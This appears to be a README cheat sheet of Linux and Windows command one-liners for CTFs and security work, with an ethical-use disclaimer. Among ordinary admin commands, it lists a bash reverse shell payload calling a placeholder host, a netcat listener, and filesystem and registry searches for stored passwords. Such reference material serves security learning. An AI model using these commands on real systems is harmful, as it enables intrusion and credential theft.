# ⚙️ Awesome CMD One-Liners for Linux & Windows

Welcome to my personal collection of powerful one-liners for Linux and Windows, forged from real-world cybersecurity tasks, CTFs, and daily command-line wizardry. Whether you're enumerating a system, grabbing credentials, or scripting on the fly, these one-liners are here to get the job done fast.

---

## ⚠️ Legal & Ethical Disclaimer

This repository is **intended for educational and ethical purposes only.**  
Do not use these commands on any system without **explicit permission.**  
You are fully responsible for any misuse or damage caused by improper application.

---

## 🐧 Linux One-Liners (15)

| Command | Description |
|--------|-------------|
| `find / -perm -4000 2>/dev/null` | 🔍 Find all SUID binaries — great for local privilege escalation |
| `nc -lvnp 4444` | 🦻 Start a listener on port 4444 using netcat |
| `curl ifconfig.me` | 🌍 Get your public IP address via CLI |
| `cat /etc/passwd | cut -d: -f1` | 👤 List all user accounts on a Linux system |
| `grep -r "password" / 2>/dev/null` | 🔑 Hunt for password strings across the filesystem |
| `sudo -l` | 🧯 Check sudo privileges — useful for escalation |
| `ip a` | 📡 View all IP addresses and interfaces |
| `wget http://[IP]/file` | 📥 Download a file from a remote server (HTTP) |
| `scp user@host:/path/to/file .` | 📦 Securely copy a remote file to your system |
| `chmod +x script.sh && ./script.sh` | 🛠️ Make a script executable and run it |
| `echo 'bash -i >& /dev/tcp/IP/PORT 0>&1'` | 🐚 Quick reverse shell payload |
| `tar -cvf archive.tar folder/` | 📦 Archive a folder (useful for exfil or CTF) |
| `history | grep ssh` | 📜 Look through command history for past SSH usage |
| `ps aux | grep python` | 🧪 Check if any Python processes are running |
| `ls -laR /home/ 2>/dev/null | grep flag` | 🚩 Recursively search user dirs for a CTF flag |

---

## 🪟 Windows One-Liners (5)

| Command | Description |
|--------|-------------|
| `whoami /priv` | 🔐 Display user privileges — great for privesc |
| `netstat -ano` | 🌐 View active connections with associated PIDs |
| `type C:\Users\*\Desktop\*.txt` | 📂 Read all .txt files on user desktops (CTF classic) |
| `Get-LocalUser | Select Name, Enabled` | 👥 List local users and check which are active (PowerShell) |
| `reg query HKLM /f password /t REG_SZ /s` | 🕵️‍♂️ Search Windows registry for stored plaintext passwords |

---

## 📎 How to Use

Clone this repo, keep it in your terminal cheat sheet folder, or memorize them.  
Want more? I plan to expand this with categorized sections like **Web**, **Network**, **Forensics**, and more.

---

## 🤝 Contributions

Found a cool one-liner or have a tip? Open a pull request or drop an issue, sharing is caring!

---

> 🧠 "One good command can save hours of hard work."
